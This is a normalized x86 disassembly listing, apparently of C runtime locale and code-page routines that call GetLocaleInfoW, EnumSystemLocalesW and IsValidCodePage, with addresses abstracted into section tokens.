mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_43aeb9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_42d0aa
pop ecx
sub_43aed9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
[ eax + 0xc ]
mov ecx [ eax + 0x7c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x84 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x80 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
[ ecx ]
push esi
push 0x6
lea ecx [ eax + 0x28 ]
pop esi
[ ecx ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx 0x10
sub esi 0x1
jne r-xdata
mov edx [ ecx - 0x4 ]
test edx edx
je r-xdata
[ edx ]
cmp [ ecx - 0x8 ] rw-data
je r-xdata
mov eax [ eax + 0x9c ]
add eax 0xb0
[ eax ]
pop esi
pop ebp
retn
[ edx ]
sub_43af58
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0x9c ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0x28 ]
cmp [ eax + 0xb0 ] ebx
jne r-xdata
mov eax [ esi + 0x90 ]
sub eax 0xfe
push eax
call sub_42d0aa
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_42d0aa
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_42d0aa
push [ esi + 0x8c ]
call sub_42d0aa
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call sub_43a2d3
push [ esi + 0x9c ]
call sub_42d0aa
pop ecx
pop ecx
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
add ebx 0x4
add edi 0x10
sub eax 0x1
mov [ ebp - 0x4 ] eax
jne r-xdata
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_42d0aa
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_42d0aa
push [ ebx ]
call sub_42d0aa
pop ecx
pop ecx
push [ esi + 0x7c ]
call sub_42d0aa
push [ esi + 0x88 ]
call sub_42d0aa
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_42d0aa
push [ esi + 0x88 ]
call sub_43997e
pop ecx
pop ecx
push eax
call sub_42d0aa
pop ecx
push eax
call sub_42d0aa
push [ esi + 0x88 ]
call sub_439e72
pop ecx
pop ecx
sub_43b0bc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
[ eax + 0xc ]
mov ecx [ eax + 0x7c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x84 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x80 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
[ ecx ]
push esi
push 0x6
lea ecx [ eax + 0x28 ]
pop esi
[ ecx ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx 0x10
sub esi 0x1
jne r-xdata
mov edx [ ecx - 0x4 ]
test edx edx
je r-xdata
[ edx ]
cmp [ ecx - 0x8 ] rw-data
je r-xdata
mov eax [ eax + 0x9c ]
add eax 0xb0
[ eax ]
pop esi
[ edx ]
sub_43b13f
push 0xc
push r--data
call sub_40d260
and [ ebp - 0x1c ] 0x0
call sub_42fa1d
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x350 ] ecx
je r-xdata
push 0x4
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ edi + 0x4c ]
push eax
call sub_43b1b6
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43b1a5
test esi esi
jne r-xdata
mov esi [ edi + 0x4c ]
test esi esi
jne r-xdata
mov eax esi
call sub_40d2a6
retn
call sub_42d153
sub_43b1b6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edi [ eax ]
cmp edi esi
jne r-xdata
push esi
mov [ eax ] esi
call sub_43aed9
pop ecx
test edi edi
je r-xdata
mov eax esi
jmp r-xdata
push edi
call sub_43b0bc
cmp [ edi + 0xc ] 0x0
pop ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
cmp edi rw-data
je r-xdata
push edi
call sub_43af58
pop ecx
jmp r-xdata
sub_43b206
mov edi edi
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0xb0 ]
push 0x55
push eax
or [ esi + 0x8 ] 0x104
call sub_430b72
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0xb0 ]
push edi
lea edx [ ecx + 0x2 ]
xor edi edi
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea eax [ esi + 0x250 ]
push 0x55
push eax
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_42fdfc
int3
pop edi
sub_43b28f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
push 0x2
pop edx
mov ecx [ esi ]
mov [ ebp - 0x4 ] ebx
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor ebx ebx
sar ecx 0x1
cmp ecx 0x3
mov ecx [ esi + 0x4 ]
sete bl
mov [ esi + 0x10 ] ebx
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax [ ebp - 0x4 ]
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x14 ] eax
test ebx ebx
jne r-xdata
xor ebx ebx
mov [ esi + 0xc ] edx
push ebx
push ebx
push 0x3
push sub_43b3b8
call sub_430746
mov ecx [ esi + 0x8 ]
test cl 0x7
setne dl
bt ecx 0x9
setb al
and dl al
bt ecx 0x8
setb al
test al dl
jne r-xdata
push [ esi ]
call sub_43b384
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x8 ] ebx
sub_43b329
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
push 0x2
pop edx
mov ecx [ esi ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x10 ] eax
test eax eax
jne r-xdata
push ebx
push ebx
push 0x3
push sub_43b6a2
mov [ esi + 0xc ] edx
call sub_430746
test [ esi + 0x8 ] 0x4
jne r-xdata
push [ esi ]
call sub_43b384
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi + 0x8 ] ebx
sub_43b384
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
test ecx ecx
jne r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
sub_43b3b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_42fa1d
mov esi eax
lea eax [ ebp - 0x84 ]
push 0x40
push eax
mov ecx [ esi + 0x64 ]
neg ecx
sbb ecx ecx
and ecx 0xfffff005
add ecx 0x1002
push ecx
push edi
call sub_430a42
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x54 ]
call sub_4457d9
xor ebx ebx
mov [ ebp - 0x88 ] ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x58 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0x40
lea eax [ ebp - 0x84 ]
push eax
mov eax [ esi + 0x60 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call sub_430a42
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x58 ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ esi + 0x60 ]
lea eax [ ebp - 0x84 ]
neg ecx
push 0x40
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push edi
call sub_430a42
test eax eax
jne r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] ebx
jmp r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi + 0x58 ] ebx
test [ esi + 0x58 ] 0x2
jne r-xdata
or [ esi + 0x58 ] 0x304
mov ecx edi
lea edx [ ecx + 0x2 ]
xor eax eax
inc eax
jmp r-xdata
or [ esi + 0x58 ] 0x200
mov edx [ esi + 0x58 ]
cmp [ esi + 0x60 ] ebx
je r-xdata
pop ebx
cmp [ esi + 0x5c ] ebx
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
lea eax [ esi + 0x2a0 ]
push 0x55
push eax
call sub_436871
add esp 0x10
test eax eax
je r-xdata
cmp [ esi + 0x5c ] ebx
je r-xdata
or edx 0x100
mov [ esi + 0x58 ] edx
lea edx [ esi + 0x2a0 ]
cmp [ edx ] bx
jne r-xdata
test [ esi + 0x58 ] 0x1
jne r-xdata
push [ esi + 0x5c ]
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x50 ]
call sub_43e07b
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
or edx 0x100
mov [ esi + 0x58 ] edx
lea edx [ esi + 0x2a0 ]
cmp [ edx ] bx
jne r-xdata
mov ecx [ esi + 0x50 ]
lea ebx [ ecx + 0x2 ]
mov ecx edi
lea ebx [ ecx + 0x2 ]
push edi
call sub_43b84a
pop ecx
test eax eax
je r-xdata
or [ esi + 0x58 ] 0x2
mov ecx edi
lea edx [ ecx + 0x2 ]
push ebx
push ebx
push ebx
push ebx
push ebx
mov ecx edi
lea ebx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
sub ecx ebx
sar ecx 0x1
cmp ecx [ esi + 0x5c ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
sub ecx ebx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
push 0x55
push edx
call sub_436871
add esp 0x10
test eax eax
je r-xdata
or [ esi + 0x58 ] 0x1
mov ecx edi
lea edx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
jmp r-xdata
xor ebx ebx
push edi
call sub_43b84a
pop ecx
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
jmp r-xdata
or [ esi + 0x58 ] 0x100
lea edx [ esi + 0x2a0 ]
xor eax eax
cmp [ edx ] ax
jne r-xdata
mov ebx [ esi + 0x50 ]
xor edx edx
lea ecx [ ebx + 0x2 ]
call sub_42fdfc
int3
mov ecx edi
lea ebx [ ecx + 0x2 ]
mov ax [ ebx ]
add ebx 0x2
cmp ax dx
jne r-xdata
push [ esi + 0x50 ]
sub ebx ecx
sar ebx 0x1
call sub_43b384
pop ecx
cmp eax ebx
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x88 ]
jne r-xdata
jmp r-xdata
sub_43b6a2
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_42fa1d
mov esi eax
lea eax [ ebp - 0xf4 ]
push 0x78
push eax
mov ecx [ esi + 0x60 ]
neg ecx
sbb ecx ecx
and ecx 0xfffff002
add ecx 0x1001
push ecx
push edi
call sub_430a42
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ esi + 0x50 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x58 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x58 ]
shr eax 0x2
not eax
and eax 0x1
mov ecx edi
push ebx
xor ebx ebx
lea edx [ ecx + 0x2 ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0xc
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push edi
lea eax [ esi + 0x2a0 ]
push 0x55
push eax
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42fdfc
int3
or [ esi + 0x58 ] 0x4
pop ebx
sub_43b763
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x20001004
add eax 0x250
push eax
call sub_430a42
test eax eax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esi r--data
mov edx ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetACP@IAT ]
sbb edx edx
or edx 0x1
test di di
je r-xdata
mov esi r--data
mov edx ecx
mov edx eax
jmp r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
sbb eax eax
or eax 0x1
test di di
je r-xdata
test edx edx
je r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
push ecx
call sub_42f1a0
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x2000000b
add eax 0x250
push eax
call sub_430a42
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
jmp r-xdata
sub_43b84a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push 0x9
push eax
push 0x59
push esi
call sub_430a42
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
push 0x9
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_43acc8
add esp 0xc
neg eax
sbb eax eax
inc eax
sub_43b895
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_43b84a
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0x10 ]
push esi
mov ecx [ eax ]
mov esi ecx
lea edx [ esi + 0x2 ]
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
sub esi edx
push ecx
sar esi 0x1
call sub_43b384
pop ecx
cmp eax esi
pop esi
jne r-xdata
xor eax eax
pop ebp
retn
sub_43b8db
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
xor edx edx
push edi
inc edx
xor edi edi
test esi esi
js r-xdata
xor eax eax
test edx edx
pop edi
sete al
pop esi
mov esp ebp
pop ebp
retn
push ebx
pop ebx
lea eax [ edi + esi ]
cdq
sub eax edx
mov ebx eax
mov eax [ ebp + 0x8 ]
sar ebx 0x1
imul ecx ebx 0xc
mov [ ebp - 0x4 ] ecx
push [ ecx + eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4457d9
mov edx eax
pop ecx
pop ecx
test edx edx
jne r-xdata
jns r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax 0x4
add ecx eax
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
jmp r-xdata
lea edi [ ebx + 0x1 ]
lea esi [ ebx - 0x1 ]
jmp r-xdata
cmp edi esi
jle r-xdata
test edx edx
je r-xdata
sub_43b94a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
call sub_42fa1d
mov ebx [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x8 ] ecx
lea esi [ eax + 0x50 ]
lea eax [ esi + 0x250 ]
mov [ esi + 0x8 ] ecx
mov [ eax ] cx
lea edi [ esi + 0x4 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x80 ]
mov [ esi ] ebx
mov [ edi ] eax
cmp [ eax ] cx
je r-xdata
mov eax [ esi ]
push esi
cmp [ eax ] cx
je r-xdata
push edi
push 0x16
push r--data
call sub_43b8db
add esp 0xc
xor ecx ecx
call sub_43b206
mov eax [ edi ]
cmp [ eax ] cx
je r-xdata
xor eax eax
lea eax [ ebx + 0x100 ]
push esi
push eax
call sub_43b763
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_43b329
call sub_43b28f
jmp r-xdata
cmp esi 0xfde8
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
je r-xdata
push esi
push 0x40
push r--data
call sub_43b8db
add esp 0xc
test eax eax
je r-xdata
xor eax eax
pop ecx
cmp [ esi + 0x8 ] eax
jne r-xdata
cmp esi 0xfde9
je r-xdata
mov eax [ edi ]
xor ecx ecx
push esi
cmp [ eax ] cx
je r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
call sub_43b329
jmp r-xdata
call sub_43b28f
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop ecx
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
lea ebx [ edi + 0x120 ]
xor eax eax
mov [ ebx ] ax
lea edx [ ecx + 0x2 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x8 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push [ ebp - 0x4 ]
push 0x55
push ebx
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
push 0x40
push edi
push 0x1001
push ebx
call sub_430a42
test eax eax
je r-xdata
push 0x40
lea ebx [ edi + 0x80 ]
push ebx
push 0x1002
lea eax [ edi + 0x120 ]
push eax
call sub_430a42
test eax eax
je r-xdata
push 0x5f
push ebx
call sub_44cd1b
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x40
push ebx
push 0x7
lea eax [ edi + 0x120 ]
push eax
call sub_430a42
test eax eax
je r-xdata
push 0x2e
push ebx
call sub_44cd1b
pop ecx
pop ecx
test eax eax
je r-xdata
push 0xa
push 0x10
lea eax [ edi + 0x100 ]
push eax
push esi
call sub_4455d0
add esp 0x10
sub_43bb19
mov edi edi
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42fa1d
mov ebx eax
call sub_42fa1d
push esi
mov edi [ eax + 0x34c ]
call sub_43c07b
pop ecx
mov ecx [ ebx + 0x64 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x54 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
push esi
call sub_43c1af
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
or [ edi ] 0x4
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] esi
sub_43bbc2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
call sub_42fa1d
mov edx eax
xor edi edi
mov ecx [ edx + 0x54 ]
lea esi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx esi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
push 0x1
sete al
push sub_43bb19
mov [ edx + 0x64 ] eax
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
test [ eax ] 0x4
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ eax ] edi
sub_43bc2b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_42fa1d
mov esi eax
xor ebx ebx
push 0x2
pop edx
mov ecx [ esi + 0x50 ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
mov ecx [ esi + 0x54 ]
sete al
mov [ esi + 0x60 ] eax
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
mov edi [ ebp + 0x8 ]
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x64 ] eax
mov [ edi + 0x4 ] ebx
cmp [ esi + 0x60 ] ebx
jne r-xdata
push 0x1
push sub_43bd53
mov [ esi + 0x5c ] edx
call [ EnumSystemLocalesW@IAT ]
mov ecx [ edi ]
test cl 0x7
setne dl
bt ecx 0x9
setb al
and dl al
bt ecx 0x8
setb al
test al dl
jne r-xdata
push [ esi + 0x50 ]
call sub_43bd27
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ edi ] ebx
sub_43bcc6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_42fa1d
mov esi eax
xor ebx ebx
push 0x2
pop edx
mov ecx [ esi + 0x50 ]
lea edi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx edx
cmp ax bx
jne r-xdata
sub ecx edi
xor eax eax
sar ecx 0x1
cmp ecx 0x3
sete al
mov [ esi + 0x60 ] eax
test eax eax
jne r-xdata
push 0x1
push sub_43bfa3
mov [ esi + 0x5c ] edx
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
test [ eax ] 0x4
jne r-xdata
push [ esi + 0x50 ]
call sub_43bd27
pop ecx
mov edx eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ eax ] ebx
sub_43bd27
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
sub_43bd53
mov edi edi
push ebp
mov ebp esp
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42fa1d
mov ebx eax
call sub_42fa1d
push esi
mov edi [ eax + 0x34c ]
call sub_43c07b
pop ecx
mov ecx [ ebx + 0x64 ]
mov esi eax
neg ecx
lea eax [ ebp - 0xf4 ]
push 0x78
sbb ecx ecx
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x54 ]
call sub_4457d9
and [ ebp - 0xf8 ] 0x0
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] 0x0
mov eax [ edi ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0x78
lea eax [ ebp - 0xf4 ]
push eax
mov eax [ ebx + 0x60 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ ebx + 0x60 ]
lea eax [ ebp - 0xf4 ]
neg ecx
push 0x78
sbb ecx ecx
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ edi ] eax
jmp r-xdata
test [ edi ] 0x2
jne r-xdata
or [ edi ] 0x304
mov [ edi + 0x4 ] esi
jmp r-xdata
xor eax eax
cmp [ ebx + 0x60 ] eax
jne r-xdata
or [ edi ] 0x200
mov edx [ edi ]
cmp [ ebx + 0x60 ] eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov [ edi + 0x8 ] esi
cmp [ ebx + 0x5c ] eax
je r-xdata
cmp [ ebx + 0x5c ] eax
je r-xdata
or edx 0x100
mov [ edi ] edx
mov edx [ edi ]
test dl 0x1
jne r-xdata
push [ ebx + 0x5c ]
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_43e07b
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x50 ]
call sub_4457d9
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebx + 0x50 ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0xfc ] eax
jne r-xdata
push esi
call sub_43c1af
pop ecx
test eax eax
je r-xdata
or [ edi ] 0x2
mov [ edi + 0x8 ] esi
mov ecx [ ebx + 0x50 ]
lea edx [ ecx + 0x2 ]
push edi
xor ebx ebx
push ebx
push esi
call sub_43c1d3
add esp 0xc
test eax eax
je r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0xf8 ]
jne r-xdata
sub ecx [ ebp - 0xfc ]
sar ecx 0x1
cmp ecx [ ebx + 0x5c ]
jne r-xdata
mov [ edi + 0x4 ] esi
or edx 0x1
mov [ edi ] edx
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0xf8 ]
